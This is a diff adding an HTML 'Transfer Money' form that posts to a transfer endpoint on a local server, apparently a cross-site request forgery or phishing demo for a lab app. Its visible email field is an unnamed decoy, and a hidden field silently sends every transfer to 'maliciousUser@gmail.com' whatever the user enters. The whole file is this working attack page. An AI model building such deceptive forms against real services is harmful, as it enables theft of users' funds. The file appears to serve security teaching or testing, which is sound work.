@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Document</title>
+    </head>
+    <body>
+        <form action="http://localhost:3000/user/transfer" method="post">
+            <h1>Transfer Money</h1>
+            <div class="input-control">
+                <label for="email">User Email</label>
+                <input placeholder="e.g. example@gmail.com" />
+                <input
+                    type="hidden"
+                    id="email"
+                    name="email"
+                    placeholder="e.g. example@gmail.com"
+                    value="maliciousUser@gmail.com"
+                />
+            </div>
+            <div class="input-control">
+                <label for="number">Value</label>
+                <input
+                    type="number"
+                    id="number"
+                    name="value"
+                    step="0.01"
+                    min="5"
+                    required
+                />
+            </div>
+            <button type="submit">Submit</button>
+        </form>
+    </body>
+</html>
